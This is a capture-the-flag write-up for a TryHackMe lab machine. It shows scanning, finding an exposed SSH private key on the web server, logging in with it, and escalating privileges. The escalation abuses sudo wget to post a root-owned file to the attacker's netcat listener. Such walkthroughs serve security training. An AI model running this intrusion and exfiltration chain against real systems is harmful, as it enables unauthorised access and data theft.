# Wgel CTF - tryhackme
# By 0xRar

## Scanning
```
nmap -A -T4 -p- -Pn MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-05 18:42 EST
Nmap scan report for MACHINE_IP
Host is up (0.16s latency).
Not shown: 65480 closed ports, 53 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Possible username : <!-- Jessie don't forget to udate the webiste -->


gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/sitemap (Status: 301)

/sitemap looks interesting



gobuster dir -u http://MACHINE_IP/sitemap -w /usr/share/wordlists/dirb/common.txt 
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)     ohhh ssh private key
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)

http://MACHINE_IP/sitemap/.ssh/id_rsa

```


## Gaining Access
```
Gained access via ssh with the private key

chmod 400 id_rsa
ssh jessie@MACHINE_IP -i id_rsa

cd Document 
flag : 057c67131c3d5*****************

```

## Privilege Escalation
```
Opened a python http server to transfer my linpeas
python3 -m http.server

and downloaded it to the target machine
wget MY_IP:8000/opt/linpeas.sh


sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget


on my machine: nc -lvp 1337


on the target's machine :
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://MY_IP:1337



listening on [any] 1337 ...
MACHINE_IP: inverse host lookup failed: Unknown host
connect to [MY_IP] from (UNKNOWN) [MACHINE_IP] 52724
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: MY_IP:1337
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

flag : b1b968b37519*****************


```
